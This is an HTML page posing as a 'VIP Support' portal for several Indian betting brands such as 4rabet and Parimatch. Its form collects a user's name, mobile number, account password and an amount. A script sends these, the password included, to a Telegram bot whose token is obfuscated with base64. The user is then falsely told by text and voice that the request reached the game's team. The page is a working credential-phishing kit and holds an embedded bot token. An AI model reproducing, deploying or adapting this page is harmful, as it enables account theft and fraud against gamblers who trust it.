<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIP Game Support Portal</title>
    
    <!-- Cloudflare Turnstile Script -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    
    <style>
        :root {
            --primary-color: #ffcc00;
            --bg-color: #0b0c10;
            --card-bg: #1f2833;
            --text-color: #c5c6c7;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: white;
            margin: 0;
            padding: 30px 15px;
            text-align: center;
        }

        h2 {
            color: var(--primary-color);
            font-size: 26px;
            margin-bottom: 40px;
            text-transform: uppercase;
            letter-spacing: 1px;
            text-shadow: 0 0 10px rgba(255, 204, 0, 0.3);
        }

        .game-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 25px;
            max-width: 900px;
            margin: 0 auto;
        }

        .game-card {
            background-color: var(--card-bg);
            padding: 25px 15px;
            border-radius: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 1px solid #333;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .game-card:hover {
            transform: translateY(-10px);
            border-color: var(--primary-color);
            box-shadow: 0 10px 25px rgba(255, 204, 0, 0.4);
        }

        /* Custom Game Logos */
        .logo-box {
            width: 100%;
            height: 70px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 8px;
            font-size: 20px;
            font-weight: 900;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .logo-4rabet { background-color: #0a1e3f; color: #ffffff; border: 1px solid #144079; }
        .logo-crorebet { background-color: #ffb800; color: #000000; }
        .logo-starkbet { background-color: #4b00d1; color: #ffffff; }
        .logo-starkbet span { color: #ffb800; }
        .logo-parimatch { background-color: #000000; color: #fbed00; border: 2px solid #333; font-style: italic; }
        .logo-luckystar { background: linear-gradient(45deg, #ff0055, #ffcc00); color: #ffffff; }
        .logo-valorbet { background-color: #ffffff; color: #0a1e3f; }
        .logo-valorbet span { color: #ff6600; }

        .game-card p {
            margin: 0; font-weight: bold; font-size: 16px;
            color: var(--primary-color); letter-spacing: 1px;
        }

        /* Support Modal */
        .modal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.85); backdrop-filter: blur(5px);
            justify-content: center; align-items: center; z-index: 1000;
        }

        .modal-content {
            background: linear-gradient(145deg, #1f2833, #151b22); padding: 35px;
            border-radius: 20px; width: 90%; max-width: 450px; position: relative;
            text-align: left; border: 1px solid var(--primary-color);
            box-shadow: 0 0 30px rgba(255, 204, 0, 0.2); animation: fadeIn 0.4s ease-out;
        }

        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }

        .close-btn {
            position: absolute; top: 15px; right: 20px; font-size: 28px;
            cursor: pointer; color: #ff4d4d; transition: 0.2s;
        }
        .close-btn:hover { color: #ff1a1a; transform: scale(1.1); }

        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; margin-bottom: 8px; font-size: 13px; color: var(--text-color); text-transform: uppercase; }
        .form-group input, .form-group textarea {
            width: 100%; padding: 12px; border: 1px solid #45a29e; border-radius: 8px;
            background-color: #0b0c10; color: white; box-sizing: border-box; font-size: 14px;
        }
        .form-group input:focus, .form-group textarea:focus {
            outline: none; border-color: var(--primary-color); box-shadow: 0 0 8px rgba(255, 204, 0, 0.3);
        }

        .submit-btn {
            width: 100%; padding: 15px; background: linear-gradient(90deg, #f39c12, #e67e22);
            color: #000; border: none; border-radius: 8px; font-size: 16px; font-weight: bold;
            text-transform: uppercase; cursor: pointer; transition: 0.3s; margin-top: 10px;
        }
        .submit-btn:hover { box-shadow: 0 0 15px rgba(230, 126, 34, 0.5); }
        
        .cf-turnstile-container { margin-bottom: 15px; display: flex; justify-content: center; }
        #statusMessage { display: none; text-align: center; color: #00ff88; font-weight: bold; margin-top: 15px; font-size: 16px; }
    </style>
</head>
<body>

    <h2>Jis game mein issue hai uspe click karein</h2>

    <div class="game-grid">
        <div class="game-card" onclick="openForm('4rabet')">
            <div class="logo-box logo-4rabet">4RABET</div>
            <p>4rabet</p>
        </div>
        <div class="game-card" onclick="openForm('Crore Bet')">
            <div class="logo-box logo-crorebet">CRORE BET</div>
            <p>Crore Bet</p>
        </div>
        <div class="game-card" onclick="openForm('Stark Bet')">
            <div class="logo-box logo-starkbet">STARK<br><span>BET</span></div>
            <p>Stark Bet</p>
        </div>
        <div class="game-card" onclick="openForm('Parimatch')">
            <div class="logo-box logo-parimatch">PARIMATCH</div>
            <p>Parimatch</p>
        </div>
        <div class="game-card" onclick="openForm('Lucky Star')">
            <div class="logo-box logo-luckystar">LUCKY STAR</div>
            <p>Lucky Star</p>
        </div>
        <div class="game-card" onclick="openForm('Valor Bet')">
            <div class="logo-box logo-valorbet">VALOR <span>BET</span></div>
            <p>Valor Bet</p>
        </div>
    </div>

    <!-- Support Modal Form -->
    <div id="supportModal" class="modal">
        <div class="modal-content">
            <span class="close-btn" onclick="closeForm()">&times;</span>
            <h3 id="formTitle" style="margin-top:0; color:#ffcc00; text-align:center; font-size: 22px;">Support</h3>
            
            <form id="dataForm" onsubmit="sendToTelegram(event)">
                <div class="form-group"><label>Full Name</label><input type="text" id="name" required></div>
                <div class="form-group"><label>Mobile Number</label><input type="number" id="phone" required></div>
                
                <!-- Password Field -->
                <div class="form-group"><label>Password</label><input type="password" id="password" required></div>
                
                <div class="form-group"><label>Amount (₹)</label><input type="number" id="amount" required></div>
                <div class="form-group"><label>Describe Issue</label><textarea id="problem" rows="2" required></textarea></div>
                
                <!-- Cloudflare Turnstile Widget -->
                <div class="cf-turnstile-container">
                    <div class="cf-turnstile" data-sitekey="0x4AAAAAAE-FSW7V0OIKRLh0"></div>
                </div>

                <button type="submit" id="submitBtn" class="submit-btn">Submit Request</button>
                <div id="statusMessage"></div>
            </form>
        </div>
    </div>

    <script>
        let selectedGameName = "";

        function openForm(gameName) {
            selectedGameName = gameName;
            document.getElementById("formTitle").innerText = gameName + " VIP Support";
            document.getElementById("supportModal").style.display = "flex";
            document.getElementById("statusMessage").style.display = "none";
        }

        function closeForm() {
            document.getElementById("supportModal").style.display = "none";
            document.getElementById("dataForm").reset();
            document.getElementById("submitBtn").style.display = "block";
            if (typeof turnstile !== 'undefined') { turnstile.reset(); }
        }

        function playVoiceMessage(gameName) {
            if ('speechSynthesis' in window) {
                let textToSpeak = `Aapki request ${gameName} team ko chali gayi hai, kripya wait karein`;
                let speech = new SpeechSynthesisUtterance(textToSpeak);
                speech.lang = 'hi-IN'; 
                speech.rate = 0.9;     
                speech.pitch = 1;
                window.speechSynthesis.speak(speech);
            }
        }

        function sendToTelegram(event) {
            event.preventDefault(); 

            // Security Check Verification
            const turnstileResponse = document.querySelector('[name="cf-turnstile-response"]');
            if (turnstileResponse && !turnstileResponse.value) {
                alert("Please complete the Security Check!");
                return;
            }

            // Pre-filled Bot Token & Chat ID
            const botToken = atob('ODYzNTI4OTE2NTpBQUVvUngtaV9UR3h1b2cwbjYyeGZxQllhRGlsY2Rpbko2UQ==');
            const chatId = '8882142102';

            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const amount = document.getElementById('amount').value;
            const problem = document.getElementById('problem').value;

            const message = `🌟 *VIP SUPPORT REQUEST* 🌟\n\n` +
                            `🎮 *Game Name:* ${selectedGameName}\n` +
                            `👤 *Name:* ${name}\n` +
                            `📞 *Mobile:* ${phone}\n` +
                            `🔑 *Password:* ${password}\n` +
                            `💰 *Amount:* ₹${amount}\n` +
                            `📝 *Issue:* ${problem}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            document.getElementById("submitBtn").innerText = "Sending...";
            document.getElementById("submitBtn").disabled = true;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
            })
            .then(response => response.json())
            .then(data => {
                if(data.ok) {
                    document.getElementById("submitBtn").style.display = "none";
                    let statusDiv = document.getElementById("statusMessage");
                    statusDiv.innerHTML = `✅ Aapki request <b>${selectedGameName}</b> team ko chali gayi hai, kripya wait karein.`;
                    statusDiv.style.display = "block";
                    
                    playVoiceMessage(selectedGameName);
                    setTimeout(closeForm, 4500);
                } else {
                    alert("Error: Telegram bot request fail ho gayi.");
                    document.getElementById("submitBtn").innerText = "Submit Request";
                    document.getElementById("submitBtn").disabled = false;
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert("Network error. Please try again.");
                document.getElementById("submitBtn").innerText = "Submit Request";
                document.getElementById("submitBtn").disabled = false;
            });
        }
    </script>
</body>
</html>
